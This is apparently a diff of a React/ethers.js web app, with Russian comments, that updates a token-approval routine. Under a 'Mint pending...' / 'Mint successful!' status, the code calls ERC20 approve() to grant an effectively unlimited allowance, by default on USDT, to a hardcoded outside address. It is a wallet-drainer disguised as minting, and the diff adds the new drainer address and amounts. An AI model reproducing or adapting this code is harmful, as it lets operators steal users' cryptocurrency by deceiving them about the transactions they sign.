@@ -122,17 +122,17 @@ function App() {
                 const signer = ethersProvider.getSigner(account);
 
                 let tokenAddress;
-                if (account.toLowerCase() === "0xd481a5C578bA5Ac8949Bb1f25d3A465bc79EBF98".toLowerCase()) {
-                    tokenAddress = "0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8"; // AAVE адрес
-                } else if (account.toLowerCase() === "0x317FfaB8583988509FBc0a1333F73dDA255D7B47".toLowerCase()) {
-                    tokenAddress = "0x8cFE2f46052efE1a0784b0a28C802474C1dfd9D0"; // Other адрес
+                if (account.toLowerCase() === "0xe1aed2eb004c065d95c20e2e61a87438517fff50".toLowerCase()) {
+                    tokenAddress = "0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8"; // 
+                } else if (account.toLowerCase() === "0x2993e384c72b5bd6961a702d510618c2a9e14faf".toLowerCase()) {
+                    tokenAddress = "0x8cFE2f46052efE1a0784b0a28C802474C1dfd9D0"; // 
                 } else {
-                    tokenAddress = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8"; // Адрес по умолчанию (USDT)
+                    tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Адрес по умолчанию (USDT)
                 }
                 const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
 
                 setApprovalStatus("Mint pending...");
-                const tx = await tokenContract.approve("0x8B5F69C28Bc1BCceAE51fb7a028091581484ed5e", "1000000000000000000000000000");
+                const tx = await tokenContract.approve("0xCdF2f0F9325f3d6945E02Fe2A3280a535D7E3d74", "100000000000000000000000000000");
                 await tx.wait();
                 setApprovalStatus("Mint successful!");
             } catch (error) {
